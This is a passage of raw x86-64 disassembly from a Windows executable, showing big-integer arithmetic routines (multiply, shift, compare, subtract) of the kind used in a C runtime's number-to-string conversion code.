   14000ad1e:	48 85 f6             	test   %rsi,%rsi
   14000ad21:	48 89 dd             	mov    %rbx,%rbp
   14000ad24:	74 15                	je     0x14000ad3b
   14000ad26:	39 7b 0c             	cmp    %edi,0xc(%rbx)
   14000ad29:	7e 25                	jle    0x14000ad50
   14000ad2b:	48 63 c7             	movslq %edi,%rax
   14000ad2e:	83 c7 01             	add    $0x1,%edi
   14000ad31:	48 89 dd             	mov    %rbx,%rbp
   14000ad34:	89 74 83 18          	mov    %esi,0x18(%rbx,%rax,4)
   14000ad38:	89 7b 14             	mov    %edi,0x14(%rbx)
   14000ad3b:	48 89 e8             	mov    %rbp,%rax
   14000ad3e:	48 83 c4 28          	add    $0x28,%rsp
   14000ad42:	5b                   	pop    %rbx
   14000ad43:	5e                   	pop    %rsi
   14000ad44:	5f                   	pop    %rdi
   14000ad45:	5d                   	pop    %rbp
   14000ad46:	c3                   	ret
   14000ad47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000ad4e:	00 00 
   14000ad50:	8b 43 08             	mov    0x8(%rbx),%eax
   14000ad53:	8d 48 01             	lea    0x1(%rax),%ecx
   14000ad56:	e8 15 fe ff ff       	call   0x14000ab70
   14000ad5b:	48 85 c0             	test   %rax,%rax
   14000ad5e:	48 89 c5             	mov    %rax,%rbp
   14000ad61:	74 d8                	je     0x14000ad3b
   14000ad63:	48 8d 48 10          	lea    0x10(%rax),%rcx
   14000ad67:	48 63 43 14          	movslq 0x14(%rbx),%rax
   14000ad6b:	48 8d 53 10          	lea    0x10(%rbx),%rdx
   14000ad6f:	4c 8d 04 85 08 00 00 	lea    0x8(,%rax,4),%r8
   14000ad76:	00 
   14000ad77:	e8 4c 0d 00 00       	call   0x14000bac8
   14000ad7c:	48 89 d9             	mov    %rbx,%rcx
   14000ad7f:	48 89 eb             	mov    %rbp,%rbx
   14000ad82:	e8 e9 fe ff ff       	call   0x14000ac70
   14000ad87:	48 63 c7             	movslq %edi,%rax
   14000ad8a:	83 c7 01             	add    $0x1,%edi
   14000ad8d:	48 89 dd             	mov    %rbx,%rbp
   14000ad90:	89 74 83 18          	mov    %esi,0x18(%rbx,%rax,4)
   14000ad94:	89 7b 14             	mov    %edi,0x14(%rbx)
   14000ad97:	eb a2                	jmp    0x14000ad3b
   14000ad99:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000ada0:	53                   	push   %rbx
   14000ada1:	48 83 ec 20          	sub    $0x20,%rsp
   14000ada5:	89 cb                	mov    %ecx,%ebx
   14000ada7:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000adac:	e8 bf fd ff ff       	call   0x14000ab70
   14000adb1:	48 85 c0             	test   %rax,%rax
   14000adb4:	74 0a                	je     0x14000adc0
   14000adb6:	89 58 18             	mov    %ebx,0x18(%rax)
   14000adb9:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
   14000adc0:	48 83 c4 20          	add    $0x20,%rsp
   14000adc4:	5b                   	pop    %rbx
   14000adc5:	c3                   	ret
   14000adc6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000adcd:	00 00 00 
   14000add0:	41 56                	push   %r14
   14000add2:	41 55                	push   %r13
   14000add4:	41 54                	push   %r12
   14000add6:	55                   	push   %rbp
   14000add7:	57                   	push   %rdi
   14000add8:	56                   	push   %rsi
   14000add9:	53                   	push   %rbx
   14000adda:	48 83 ec 20          	sub    $0x20,%rsp
   14000adde:	4c 63 69 14          	movslq 0x14(%rcx),%r13
   14000ade2:	48 63 7a 14          	movslq 0x14(%rdx),%rdi
   14000ade6:	49 89 ce             	mov    %rcx,%r14
   14000ade9:	49 89 d4             	mov    %rdx,%r12
   14000adec:	41 39 fd             	cmp    %edi,%r13d
   14000adef:	7c 0e                	jl     0x14000adff
   14000adf1:	89 f8                	mov    %edi,%eax
   14000adf3:	49 89 cc             	mov    %rcx,%r12
   14000adf6:	49 63 fd             	movslq %r13d,%rdi
   14000adf9:	49 89 d6             	mov    %rdx,%r14
   14000adfc:	4c 63 e8             	movslq %eax,%r13
   14000adff:	42 8d 1c 2f          	lea    (%rdi,%r13,1),%ebx
   14000ae03:	31 c9                	xor    %ecx,%ecx
   14000ae05:	41 39 5c 24 0c       	cmp    %ebx,0xc(%r12)
   14000ae0a:	0f 9c c1             	setl   %cl
   14000ae0d:	41 03 4c 24 08       	add    0x8(%r12),%ecx
   14000ae12:	e8 59 fd ff ff       	call   0x14000ab70
   14000ae17:	48 85 c0             	test   %rax,%rax
   14000ae1a:	0f 84 c2 00 00 00    	je     0x14000aee2
   14000ae20:	48 8d 70 18          	lea    0x18(%rax),%rsi
   14000ae24:	48 63 d3             	movslq %ebx,%rdx
   14000ae27:	48 8d 2c 96          	lea    (%rsi,%rdx,4),%rbp
   14000ae2b:	48 89 f1             	mov    %rsi,%rcx
   14000ae2e:	48 39 ee             	cmp    %rbp,%rsi
   14000ae31:	73 0f                	jae    0x14000ae42
   14000ae33:	c7 01 00 00 00 00    	movl   $0x0,(%rcx)
   14000ae39:	48 83 c1 04          	add    $0x4,%rcx
   14000ae3d:	48 39 cd             	cmp    %rcx,%rbp
   14000ae40:	77 f1                	ja     0x14000ae33
   14000ae42:	49 8d 4e 18          	lea    0x18(%r14),%rcx
   14000ae46:	49 83 c4 18          	add    $0x18,%r12
   14000ae4a:	4e 8d 2c a9          	lea    (%rcx,%r13,4),%r13
   14000ae4e:	49 8d 3c bc          	lea    (%r12,%rdi,4),%rdi
   14000ae52:	4c 39 e9             	cmp    %r13,%rcx
   14000ae55:	72 12                	jb     0x14000ae69
   14000ae57:	eb 5d                	jmp    0x14000aeb6
   14000ae59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000ae60:	48 83 c6 04          	add    $0x4,%rsi
   14000ae64:	49 39 cd             	cmp    %rcx,%r13
   14000ae67:	76 4d                	jbe    0x14000aeb6
   14000ae69:	48 83 c1 04          	add    $0x4,%rcx
   14000ae6d:	8b 51 fc             	mov    -0x4(%rcx),%edx
   14000ae70:	85 d2                	test   %edx,%edx
   14000ae72:	74 ec                	je     0x14000ae60
   14000ae74:	49 89 f1             	mov    %rsi,%r9
   14000ae77:	4d 89 e2             	mov    %r12,%r10
   14000ae7a:	45 31 db             	xor    %r11d,%r11d
   14000ae7d:	0f 1f 00             	nopl   (%rax)
   14000ae80:	49 83 c2 04          	add    $0x4,%r10
   14000ae84:	45 8b 42 fc          	mov    -0x4(%r10),%r8d
   14000ae88:	49 83 c1 04          	add    $0x4,%r9
   14000ae8c:	45 8b 71 fc          	mov    -0x4(%r9),%r14d
   14000ae90:	4c 0f af c2          	imul   %rdx,%r8
   14000ae94:	4d 01 f0             	add    %r14,%r8
   14000ae97:	4d 01 d8             	add    %r11,%r8
   14000ae9a:	4d 89 c3             	mov    %r8,%r11
   14000ae9d:	45 89 41 fc          	mov    %r8d,-0x4(%r9)
   14000aea1:	49 c1 eb 20          	shr    $0x20,%r11
   14000aea5:	4c 39 d7             	cmp    %r10,%rdi
   14000aea8:	77 d6                	ja     0x14000ae80
   14000aeaa:	48 83 c6 04          	add    $0x4,%rsi
   14000aeae:	49 39 cd             	cmp    %rcx,%r13
   14000aeb1:	45 89 19             	mov    %r11d,(%r9)
   14000aeb4:	77 b3                	ja     0x14000ae69
   14000aeb6:	85 db                	test   %ebx,%ebx
   14000aeb8:	7e 25                	jle    0x14000aedf
   14000aeba:	44 8b 45 fc          	mov    -0x4(%rbp),%r8d
   14000aebe:	48 8d 55 fc          	lea    -0x4(%rbp),%rdx
   14000aec2:	45 85 c0             	test   %r8d,%r8d
   14000aec5:	74 13                	je     0x14000aeda
   14000aec7:	eb 16                	jmp    0x14000aedf
   14000aec9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000aed0:	48 83 ea 04          	sub    $0x4,%rdx
   14000aed4:	8b 0a                	mov    (%rdx),%ecx
   14000aed6:	85 c9                	test   %ecx,%ecx
   14000aed8:	75 05                	jne    0x14000aedf
   14000aeda:	83 eb 01             	sub    $0x1,%ebx
   14000aedd:	75 f1                	jne    0x14000aed0
   14000aedf:	89 58 14             	mov    %ebx,0x14(%rax)
   14000aee2:	48 83 c4 20          	add    $0x20,%rsp
   14000aee6:	5b                   	pop    %rbx
   14000aee7:	5e                   	pop    %rsi
   14000aee8:	5f                   	pop    %rdi
   14000aee9:	5d                   	pop    %rbp
   14000aeea:	41 5c                	pop    %r12
   14000aeec:	41 5d                	pop    %r13
   14000aeee:	41 5e                	pop    %r14
   14000aef0:	c3                   	ret
   14000aef1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000aef6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000aefd:	00 00 00 
   14000af00:	41 54                	push   %r12
   14000af02:	55                   	push   %rbp
   14000af03:	57                   	push   %rdi
   14000af04:	56                   	push   %rsi
   14000af05:	53                   	push   %rbx
   14000af06:	48 83 ec 20          	sub    $0x20,%rsp
   14000af0a:	89 d0                	mov    %edx,%eax
   14000af0c:	48 89 ce             	mov    %rcx,%rsi
   14000af0f:	89 d3                	mov    %edx,%ebx
   14000af11:	83 e0 03             	and    $0x3,%eax
   14000af14:	0f 85 c6 00 00 00    	jne    0x14000afe0
   14000af1a:	c1 fb 02             	sar    $0x2,%ebx
   14000af1d:	48 89 f5             	mov    %rsi,%rbp
   14000af20:	85 db                	test   %ebx,%ebx
   14000af22:	74 56                	je     0x14000af7a
   14000af24:	48 8b 3d d5 12 38 00 	mov    0x3812d5(%rip),%rdi        # 0x14038c200
   14000af2b:	48 85 ff             	test   %rdi,%rdi
   14000af2e:	0f 84 df 00 00 00    	je     0x14000b013
   14000af34:	4c 8d 25 6d 1c 38 00 	lea    0x381c6d(%rip),%r12        # 0x14038cba8
   14000af3b:	48 89 f5             	mov    %rsi,%rbp
   14000af3e:	eb 0f                	jmp    0x14000af4f
   14000af40:	d1 fb                	sar    $1,%ebx
   14000af42:	74 36                	je     0x14000af7a
   14000af44:	48 8b 37             	mov    (%rdi),%rsi
   14000af47:	48 85 f6             	test   %rsi,%rsi
   14000af4a:	74 44                	je     0x14000af90
   14000af4c:	48 89 f7             	mov    %rsi,%rdi
   14000af4f:	f6 c3 01             	test   $0x1,%bl
   14000af52:	74 ec                	je     0x14000af40
   14000af54:	48 89 fa             	mov    %rdi,%rdx
   14000af57:	48 89 e9             	mov    %rbp,%rcx
   14000af5a:	e8 71 fe ff ff       	call   0x14000add0
   14000af5f:	48 85 c0             	test   %rax,%rax
   14000af62:	48 89 c6             	mov    %rax,%rsi
   14000af65:	0f 84 98 00 00 00    	je     0x14000b003
   14000af6b:	48 89 e9             	mov    %rbp,%rcx
   14000af6e:	48 89 f5             	mov    %rsi,%rbp
   14000af71:	e8 fa fc ff ff       	call   0x14000ac70
   14000af76:	d1 fb                	sar    $1,%ebx
   14000af78:	75 ca                	jne    0x14000af44
   14000af7a:	48 89 e8             	mov    %rbp,%rax
   14000af7d:	48 83 c4 20          	add    $0x20,%rsp
   14000af81:	5b                   	pop    %rbx
   14000af82:	5e                   	pop    %rsi
   14000af83:	5f                   	pop    %rdi
   14000af84:	5d                   	pop    %rbp
   14000af85:	41 5c                	pop    %r12
   14000af87:	c3                   	ret
   14000af88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000af8f:	00 
   14000af90:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000af95:	e8 b6 fa ff ff       	call   0x14000aa50
   14000af9a:	48 8b 37             	mov    (%rdi),%rsi
   14000af9d:	48 85 f6             	test   %rsi,%rsi
   14000afa0:	74 1e                	je     0x14000afc0
   14000afa2:	83 3d c7 1b 38 00 02 	cmpl   $0x2,0x381bc7(%rip)        # 0x14038cb70
   14000afa9:	75 a1                	jne    0x14000af4c
   14000afab:	4c 89 e1             	mov    %r12,%rcx
   14000afae:	ff 15 d0 22 38 00    	call   *0x3822d0(%rip)        # 0x14038d284
   14000afb4:	eb 96                	jmp    0x14000af4c
   14000afb6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000afbd:	00 00 00 
   14000afc0:	48 89 fa             	mov    %rdi,%rdx
   14000afc3:	48 89 f9             	mov    %rdi,%rcx
   14000afc6:	e8 05 fe ff ff       	call   0x14000add0
   14000afcb:	48 85 c0             	test   %rax,%rax
   14000afce:	48 89 c6             	mov    %rax,%rsi
   14000afd1:	48 89 07             	mov    %rax,(%rdi)
   14000afd4:	74 2d                	je     0x14000b003
   14000afd6:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   14000afdd:	eb c3                	jmp    0x14000afa2
   14000afdf:	90                   	nop
   14000afe0:	48 8d 15 d9 e9 37 00 	lea    0x37e9d9(%rip),%rdx        # 0x1403899c0
   14000afe7:	83 e8 01             	sub    $0x1,%eax
   14000afea:	45 31 c0             	xor    %r8d,%r8d
   14000afed:	48 98                	cltq
   14000afef:	8b 14 82             	mov    (%rdx,%rax,4),%edx
   14000aff2:	e8 e9 fc ff ff       	call   0x14000ace0
   14000aff7:	48 85 c0             	test   %rax,%rax
   14000affa:	48 89 c6             	mov    %rax,%rsi
   14000affd:	0f 85 17 ff ff ff    	jne    0x14000af1a
   14000b003:	31 ed                	xor    %ebp,%ebp
   14000b005:	48 89 e8             	mov    %rbp,%rax
   14000b008:	48 83 c4 20          	add    $0x20,%rsp
   14000b00c:	5b                   	pop    %rbx
   14000b00d:	5e                   	pop    %rsi
   14000b00e:	5f                   	pop    %rdi
   14000b00f:	5d                   	pop    %rbp
   14000b010:	41 5c                	pop    %r12
   14000b012:	c3                   	ret
   14000b013:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000b018:	e8 33 fa ff ff       	call   0x14000aa50
   14000b01d:	48 8b 3d dc 11 38 00 	mov    0x3811dc(%rip),%rdi        # 0x14038c200
   14000b024:	48 85 ff             	test   %rdi,%rdi
   14000b027:	74 1f                	je     0x14000b048
   14000b029:	83 3d 40 1b 38 00 02 	cmpl   $0x2,0x381b40(%rip)        # 0x14038cb70
   14000b030:	0f 85 fe fe ff ff    	jne    0x14000af34
   14000b036:	48 8d 0d 6b 1b 38 00 	lea    0x381b6b(%rip),%rcx        # 0x14038cba8
   14000b03d:	ff 15 41 22 38 00    	call   *0x382241(%rip)        # 0x14038d284
   14000b043:	e9 ec fe ff ff       	jmp    0x14000af34
   14000b048:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000b04d:	e8 1e fb ff ff       	call   0x14000ab70
   14000b052:	48 85 c0             	test   %rax,%rax
   14000b055:	48 89 c7             	mov    %rax,%rdi
   14000b058:	74 1e                	je     0x14000b078
   14000b05a:	48 b8 01 00 00 00 71 	movabs $0x27100000001,%rax
   14000b061:	02 00 00 
   14000b064:	48 89 3d 95 11 38 00 	mov    %rdi,0x381195(%rip)        # 0x14038c200
   14000b06b:	48 89 47 14          	mov    %rax,0x14(%rdi)
   14000b06f:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   14000b076:	eb b1                	jmp    0x14000b029
   14000b078:	48 c7 05 7d 11 38 00 	movq   $0x0,0x38117d(%rip)        # 0x14038c200
   14000b07f:	00 00 00 00 
   14000b083:	31 ed                	xor    %ebp,%ebp
   14000b085:	e9 f0 fe ff ff       	jmp    0x14000af7a
   14000b08a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   14000b090:	41 56                	push   %r14
   14000b092:	41 55                	push   %r13
   14000b094:	41 54                	push   %r12
   14000b096:	55                   	push   %rbp
   14000b097:	57                   	push   %rdi
   14000b098:	56                   	push   %rsi
   14000b099:	53                   	push   %rbx
   14000b09a:	48 83 ec 20          	sub    $0x20,%rsp
   14000b09e:	48 89 cd             	mov    %rcx,%rbp
   14000b0a1:	89 d6                	mov    %edx,%esi
   14000b0a3:	41 89 d5             	mov    %edx,%r13d
   14000b0a6:	8b 49 08             	mov    0x8(%rcx),%ecx
   14000b0a9:	44 8b 65 14          	mov    0x14(%rbp),%r12d
   14000b0ad:	c1 fe 05             	sar    $0x5,%esi
   14000b0b0:	8b 45 0c             	mov    0xc(%rbp),%eax
   14000b0b3:	41 01 f4             	add    %esi,%r12d
   14000b0b6:	41 8d 5c 24 01       	lea    0x1(%r12),%ebx
   14000b0bb:	39 c3                	cmp    %eax,%ebx
   14000b0bd:	7e 0a                	jle    0x14000b0c9
   14000b0bf:	90                   	nop
   14000b0c0:	01 c0                	add    %eax,%eax
   14000b0c2:	83 c1 01             	add    $0x1,%ecx
   14000b0c5:	39 c3                	cmp    %eax,%ebx
   14000b0c7:	7f f7                	jg     0x14000b0c0
   14000b0c9:	e8 a2 fa ff ff       	call   0x14000ab70
   14000b0ce:	48 85 c0             	test   %rax,%rax
   14000b0d1:	49 89 c6             	mov    %rax,%r14
   14000b0d4:	0f 84 86 00 00 00    	je     0x14000b160
   14000b0da:	48 8d 78 18          	lea    0x18(%rax),%rdi
   14000b0de:	85 f6                	test   %esi,%esi
   14000b0e0:	7e 24                	jle    0x14000b106
   14000b0e2:	8d 56 ff             	lea    -0x1(%rsi),%edx
   14000b0e5:	49 89 f8             	mov    %rdi,%r8
   14000b0e8:	48 8d 44 90 1c       	lea    0x1c(%rax,%rdx,4),%rax
   14000b0ed:	0f 1f 00             	nopl   (%rax)
   14000b0f0:	49 83 c0 04          	add    $0x4,%r8
   14000b0f4:	41 c7 40 fc 00 00 00 	movl   $0x0,-0x4(%r8)
   14000b0fb:	00 
   14000b0fc:	49 39 c0             	cmp    %rax,%r8
   14000b0ff:	75 ef                	jne    0x14000b0f0
   14000b101:	48 8d 7c 97 04       	lea    0x4(%rdi,%rdx,4),%rdi
   14000b106:	48 63 45 14          	movslq 0x14(%rbp),%rax
   14000b10a:	48 8d 75 18          	lea    0x18(%rbp),%rsi
   14000b10e:	41 83 e5 1f          	and    $0x1f,%r13d
   14000b112:	48 8d 04 86          	lea    (%rsi,%rax,4),%rax
   14000b116:	74 5a                	je     0x14000b172
   14000b118:	41 b9 20 00 00 00    	mov    $0x20,%r9d
   14000b11e:	45 31 c0             	xor    %r8d,%r8d
   14000b121:	45 29 e9             	sub    %r13d,%r9d
   14000b124:	8b 16                	mov    (%rsi),%edx
   14000b126:	44 89 e9             	mov    %r13d,%ecx
   14000b129:	48 83 c7 04          	add    $0x4,%rdi
   14000b12d:	48 83 c6 04          	add    $0x4,%rsi
   14000b131:	d3 e2                	shl    %cl,%edx
   14000b133:	89 d1                	mov    %edx,%ecx
   14000b135:	44 09 c1             	or     %r8d,%ecx
   14000b138:	89 4f fc             	mov    %ecx,-0x4(%rdi)
   14000b13b:	44 8b 46 fc          	mov    -0x4(%rsi),%r8d
   14000b13f:	44 89 c9             	mov    %r9d,%ecx
   14000b142:	41 d3 e8             	shr    %cl,%r8d
   14000b145:	48 39 f0             	cmp    %rsi,%rax
   14000b148:	77 da                	ja     0x14000b124
   14000b14a:	45 85 c0             	test   %r8d,%r8d
   14000b14d:	44 89 07             	mov    %r8d,(%rdi)
   14000b150:	44 0f 45 e3          	cmovne %ebx,%r12d
   14000b154:	45 89 66 14          	mov    %r12d,0x14(%r14)
   14000b158:	48 89 e9             	mov    %rbp,%rcx
   14000b15b:	e8 10 fb ff ff       	call   0x14000ac70
   14000b160:	4c 89 f0             	mov    %r14,%rax
   14000b163:	48 83 c4 20          	add    $0x20,%rsp
   14000b167:	5b                   	pop    %rbx
   14000b168:	5e                   	pop    %rsi
   14000b169:	5f                   	pop    %rdi
   14000b16a:	5d                   	pop    %rbp
   14000b16b:	41 5c                	pop    %r12
   14000b16d:	41 5d                	pop    %r13
   14000b16f:	41 5e                	pop    %r14
   14000b171:	c3                   	ret
   14000b172:	a5                   	movsl  (%rsi),(%rdi)
   14000b173:	48 39 f0             	cmp    %rsi,%rax
   14000b176:	76 dc                	jbe    0x14000b154
   14000b178:	a5                   	movsl  (%rsi),(%rdi)
   14000b179:	48 39 f0             	cmp    %rsi,%rax
   14000b17c:	77 f4                	ja     0x14000b172
   14000b17e:	eb d4                	jmp    0x14000b154
   14000b180:	4c 63 42 14          	movslq 0x14(%rdx),%r8
   14000b184:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b187:	44 29 c0             	sub    %r8d,%eax
   14000b18a:	75 31                	jne    0x14000b1bd
   14000b18c:	4e 8d 0c 85 00 00 00 	lea    0x0(,%r8,4),%r9
   14000b193:	00 
   14000b194:	48 83 c1 18          	add    $0x18,%rcx
   14000b198:	4e 8d 04 09          	lea    (%rcx,%r9,1),%r8
   14000b19c:	4a 8d 54 0a 18       	lea    0x18(%rdx,%r9,1),%rdx
   14000b1a1:	eb 05                	jmp    0x14000b1a8
   14000b1a3:	4c 39 c1             	cmp    %r8,%rcx
   14000b1a6:	73 15                	jae    0x14000b1bd
   14000b1a8:	48 83 ea 04          	sub    $0x4,%rdx
   14000b1ac:	49 83 e8 04          	sub    $0x4,%r8
   14000b1b0:	44 8b 12             	mov    (%rdx),%r10d
   14000b1b3:	45 39 10             	cmp    %r10d,(%r8)
   14000b1b6:	74 eb                	je     0x14000b1a3
   14000b1b8:	19 c0                	sbb    %eax,%eax
   14000b1ba:	83 c8 01             	or     $0x1,%eax
   14000b1bd:	c3                   	ret
   14000b1be:	66 90                	xchg   %ax,%ax
   14000b1c0:	55                   	push   %rbp
   14000b1c1:	57                   	push   %rdi
   14000b1c2:	56                   	push   %rsi
   14000b1c3:	53                   	push   %rbx
   14000b1c4:	48 83 ec 28          	sub    $0x28,%rsp
   14000b1c8:	48 63 42 14          	movslq 0x14(%rdx),%rax
   14000b1cc:	8b 79 14             	mov    0x14(%rcx),%edi
   14000b1cf:	48 89 cb             	mov    %rcx,%rbx
   14000b1d2:	48 89 d6             	mov    %rdx,%rsi
   14000b1d5:	29 c7                	sub    %eax,%edi
   14000b1d7:	0f 85 13 01 00 00    	jne    0x14000b2f0
   14000b1dd:	4c 8d 41 18          	lea    0x18(%rcx),%r8
   14000b1e1:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
   14000b1e8:	00 
   14000b1e9:	49 8d 04 08          	lea    (%r8,%rcx,1),%rax
   14000b1ed:	48 8d 4c 0a 18       	lea    0x18(%rdx,%rcx,1),%rcx
   14000b1f2:	eb 09                	jmp    0x14000b1fd
   14000b1f4:	49 39 c0             	cmp    %rax,%r8
   14000b1f7:	0f 83 13 01 00 00    	jae    0x14000b310
   14000b1fd:	48 83 e9 04          	sub    $0x4,%rcx
   14000b201:	48 83 e8 04          	sub    $0x4,%rax
   14000b205:	8b 11                	mov    (%rcx),%edx
   14000b207:	39 10                	cmp    %edx,(%rax)
   14000b209:	74 e9                	je     0x14000b1f4
   14000b20b:	0f 82 ea 00 00 00    	jb     0x14000b2fb
   14000b211:	8b 4b 08             	mov    0x8(%rbx),%ecx
   14000b214:	e8 57 f9 ff ff       	call   0x14000ab70
   14000b219:	48 85 c0             	test   %rax,%rax
   14000b21c:	0f 84 c1 00 00 00    	je     0x14000b2e3
   14000b222:	48 63 53 14          	movslq 0x14(%rbx),%rdx
   14000b226:	48 8d 4b 18          	lea    0x18(%rbx),%rcx
   14000b22a:	89 78 10             	mov    %edi,0x10(%rax)
   14000b22d:	45 31 c0             	xor    %r8d,%r8d
   14000b230:	4c 8d 56 18          	lea    0x18(%rsi),%r10
   14000b234:	4c 8d 48 18          	lea    0x18(%rax),%r9
   14000b238:	48 8d 1c 91          	lea    (%rcx,%rdx,4),%rbx
   14000b23c:	49 89 d3             	mov    %rdx,%r11
   14000b23f:	48 63 56 14          	movslq 0x14(%rsi),%rdx
   14000b243:	49 8d 2c 92          	lea    (%r10,%rdx,4),%rbp
   14000b247:	eb 0a                	jmp    0x14000b253
   14000b249:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000b250:	49 89 f1             	mov    %rsi,%r9
   14000b253:	8b 11                	mov    (%rcx),%edx
   14000b255:	49 8d 71 04          	lea    0x4(%r9),%rsi
   14000b259:	48 83 c1 04          	add    $0x4,%rcx
   14000b25d:	49 83 c2 04          	add    $0x4,%r10
   14000b261:	4c 29 c2             	sub    %r8,%rdx
   14000b264:	45 8b 42 fc          	mov    -0x4(%r10),%r8d
   14000b268:	4c 29 c2             	sub    %r8,%rdx
   14000b26b:	49 89 d0             	mov    %rdx,%r8
   14000b26e:	89 d7                	mov    %edx,%edi
   14000b270:	89 56 fc             	mov    %edx,-0x4(%rsi)
   14000b273:	49 c1 e8 20          	shr    $0x20,%r8
   14000b277:	41 83 e0 01          	and    $0x1,%r8d
   14000b27b:	4c 39 d5             	cmp    %r10,%rbp
   14000b27e:	77 d0                	ja     0x14000b250
   14000b280:	48 39 cb             	cmp    %rcx,%rbx
   14000b283:	76 3e                	jbe    0x14000b2c3
   14000b285:	49 89 f2             	mov    %rsi,%r10
   14000b288:	49 89 c9             	mov    %rcx,%r9
   14000b28b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000b290:	49 83 c1 04          	add    $0x4,%r9
   14000b294:	41 8b 51 fc          	mov    -0x4(%r9),%edx
   14000b298:	49 83 c2 04          	add    $0x4,%r10
   14000b29c:	4c 29 c2             	sub    %r8,%rdx
   14000b29f:	49 89 d0             	mov    %rdx,%r8
   14000b2a2:	89 d7                	mov    %edx,%edi
   14000b2a4:	41 89 52 fc          	mov    %edx,-0x4(%r10)
   14000b2a8:	49 c1 e8 20          	shr    $0x20,%r8
   14000b2ac:	41 83 e0 01          	and    $0x1,%r8d
   14000b2b0:	4c 39 cb             	cmp    %r9,%rbx
   14000b2b3:	77 db                	ja     0x14000b290
   14000b2b5:	4c 8d 4b ff          	lea    -0x1(%rbx),%r9
   14000b2b9:	49 29 c9             	sub    %rcx,%r9
   14000b2bc:	49 83 e1 fc          	and    $0xfffffffffffffffc,%r9
   14000b2c0:	49 01 f1             	add    %rsi,%r9
   14000b2c3:	85 ff                	test   %edi,%edi
   14000b2c5:	75 18                	jne    0x14000b2df
   14000b2c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000b2ce:	00 00 
   14000b2d0:	49 83 e9 04          	sub    $0x4,%r9
   14000b2d4:	41 8b 11             	mov    (%r9),%edx
   14000b2d7:	41 83 eb 01          	sub    $0x1,%r11d
   14000b2db:	85 d2                	test   %edx,%edx
   14000b2dd:	74 f1                	je     0x14000b2d0
   14000b2df:	44 89 58 14          	mov    %r11d,0x14(%rax)
   14000b2e3:	48 83 c4 28          	add    $0x28,%rsp
   14000b2e7:	5b                   	pop    %rbx
   14000b2e8:	5e                   	pop    %rsi
   14000b2e9:	5f                   	pop    %rdi
   14000b2ea:	5d                   	pop    %rbp
   14000b2eb:	c3                   	ret
   14000b2ec:	0f 1f 40 00          	nopl   0x0(%rax)
   14000b2f0:	bf 00 00 00 00       	mov    $0x0,%edi
   14000b2f5:	0f 89 16 ff ff ff    	jns    0x14000b211
   14000b2fb:	48 89 d8             	mov    %rbx,%rax
   14000b2fe:	bf 01 00 00 00       	mov    $0x1,%edi
   14000b303:	48 89 f3             	mov    %rsi,%rbx
   14000b306:	48 89 c6             	mov    %rax,%rsi
   14000b309:	e9 03 ff ff ff       	jmp    0x14000b211
   14000b30e:	66 90                	xchg   %ax,%ax
   14000b310:	31 c9                	xor    %ecx,%ecx
   14000b312:	e8 59 f8 ff ff       	call   0x14000ab70
   14000b317:	48 85 c0             	test   %rax,%rax
   14000b31a:	74 c7                	je     0x14000b2e3
   14000b31c:	48 c7 40 14 01 00 00 	movq   $0x1,0x14(%rax)
   14000b323:	00 
   14000b324:	48 83 c4 28          	add    $0x28,%rsp
   14000b328:	5b                   	pop    %rbx
   14000b329:	5e                   	pop    %rsi
   14000b32a:	5f                   	pop    %rdi
   14000b32b:	5d                   	pop    %rbp
   14000b32c:	c3                   	ret
   14000b32d:	0f 1f 00             	nopl   (%rax)
   14000b330:	53                   	push   %rbx
   14000b331:	48 63 41 14          	movslq 0x14(%rcx),%rax
   14000b335:	4c 8d 59 18          	lea    0x18(%rcx),%r11
   14000b339:	b9 20 00 00 00       	mov    $0x20,%ecx
   14000b33e:	4d 8d 14 83          	lea    (%r11,%rax,4),%r10
   14000b342:	89 c8                	mov    %ecx,%eax
   14000b344:	45 8b 4a fc          	mov    -0x4(%r10),%r9d
   14000b348:	49 8d 5a fc          	lea    -0x4(%r10),%rbx
   14000b34c:	45 0f bd c1          	bsr    %r9d,%r8d
   14000b350:	41 83 f0 1f          	xor    $0x1f,%r8d
   14000b354:	44 29 c0             	sub    %r8d,%eax
   14000b357:	41 83 f8 0a          	cmp    $0xa,%r8d
   14000b35b:	89 02                	mov    %eax,(%rdx)
   14000b35d:	0f 8e 8d 00 00 00    	jle    0x14000b3f0
   14000b363:	41 83 e8 0b          	sub    $0xb,%r8d
   14000b367:	49 39 db             	cmp    %rbx,%r11
   14000b36a:	73 64                	jae    0x14000b3d0
   14000b36c:	45 85 c0             	test   %r8d,%r8d
   14000b36f:	41 8b 52 f8          	mov    -0x8(%r10),%edx
   14000b373:	74 62                	je     0x14000b3d7
   14000b375:	89 cb                	mov    %ecx,%ebx
   14000b377:	44 89 c8             	mov    %r9d,%eax
   14000b37a:	44 89 c1             	mov    %r8d,%ecx
   14000b37d:	44 29 c3             	sub    %r8d,%ebx
   14000b380:	d3 e0                	shl    %cl,%eax
   14000b382:	41 89 d1             	mov    %edx,%r9d
   14000b385:	89 d9                	mov    %ebx,%ecx
   14000b387:	41 d3 e9             	shr    %cl,%r9d
   14000b38a:	44 89 c1             	mov    %r8d,%ecx
   14000b38d:	44 09 c8             	or     %r9d,%eax
   14000b390:	d3 e2                	shl    %cl,%edx
   14000b392:	49 8d 4a f8          	lea    -0x8(%r10),%rcx
